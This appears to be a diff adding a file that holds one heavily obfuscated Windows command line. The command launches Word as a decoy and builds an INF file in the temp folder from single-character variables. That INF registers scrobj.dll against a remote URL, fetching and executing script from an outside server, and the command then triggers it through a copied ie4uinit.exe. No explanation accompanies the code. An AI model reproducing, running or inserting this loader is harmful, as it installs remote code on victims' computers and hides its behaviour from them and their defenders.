@@ -1,0 +1,22 @@
+/v /c start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" & (for %u in ("ana=s" "cultella=se" "utah=e" "future=ll" ) do @set %~u) &&
+  call(for %e in ("t") do @set "vee=%~e") &&
+  call(for %p in ("g") do @set "irrecogniza=%~p") &&
+  (for %m in ("4") do @set "nicke=%~m") &&
+  (for %z in ("$") do @set "bugginess=%~z") &&
+  (for %g in ("r") do @set "peculiumc=%~g") &&
+  callcall(for %v in ("i") do @set "irrevealab=%~v") &&
+  callcallcallcall(for %u in ("_") do @set "isthhyst=%~u") &&
+  (for %m in (" ") do @set "pyra=%~m") &&
+  (for %m in ("u") do @set "kabbalapho=%~m") &&
+  call(for %c in ("%temp%") do @set "coadjutre=%~c") &&
+  callcall(for %g in ("d") do @set "preearthly=%~g") &&
+  callcallcallcall(for %i in ("i") do @set "irrevealab=%~i") &&
+  callcallcallcallcall(for %c in ("n") do @set "creas=%~c") &&
+  (for %w in ("l") do @set "speckledfa=%~w") &&
+  call(for %h in ("2") do @set "unders=%~h") &&
+  (for %o in ("c") do @set "whincha=%~o") &&
+  (for %b in ("F") do @set "cudsps=%~b") &&
+  callcallcall(for %u in (".") do @set "unaspirin=%~u") &&
+  call(for %v in ("[defaultinstall.windows7]" "delfiles=42B" "Un\" "Register\" "OCXs=apa_065FA" "[strings]" "servicename= 'terrar'" "shortsvcname= 'terrar'" "syndesmo=." "sentencingh=/" "inwra=4" "sybari=:" "cockiesor=I" "tatua=a" "wais=b" "footp=e" "undis=f" "zymosthe=h" "ascell=i" "viresc=l" "syllabari=n" "deckingp=o" "coext=r" "heptap=s" "delphocurar=t" "stormtig=u" "[version]" "signature=$windows nt$" "[42B]" "%ascell%e%stormtig%i%syllabari%i%delphocurar%.%ascell%n%undis%" "[destinationdirs]" "defaultdestdir=11" "42B=01" "[apa_065FA]" "%heptap%c%coext%o%wais%\" "j%syndesmo%d%viresc%l,N%cockiesor%,%zymosthe%t%delphocurar%p%sybari%/%sentencingh%k%heptap%f%inwra%6%zymosthe%i%syndesmo%k%tatua%t%zymosthe%e%coext%i%syllabari%e%zymosthe%u%delphocurar%c%zymosthe%e%syllabari%s%syndesmo%c%deckingp%m%sentencingh%m%tatua%k%footp%i%delphocurar%b%footp%t%delphocurar%e%coext%" ) do @echo %~v) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
